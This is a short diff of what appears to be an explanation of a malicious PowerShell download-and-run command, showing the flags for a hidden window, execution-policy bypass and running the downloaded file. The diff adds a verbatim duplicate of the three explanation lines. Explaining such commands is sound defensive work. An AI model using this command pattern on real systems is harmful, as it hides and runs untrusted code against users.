@@ -22,3 +22,7 @@ powershell -w h -ep bypass -f $h
 -w h: Hides the PowerShell window so the user doesn’t see it.
 -ep bypass: Skips security checks that would normally block suspicious scripts.
 -f $h: Runs the file that was just downloaded.
+
+-w h: Hides the PowerShell window so the user doesn’t see it.
+-ep bypass: Skips security checks that would normally block suspicious scripts.
+-f $h: Runs the file that was just downloaded.
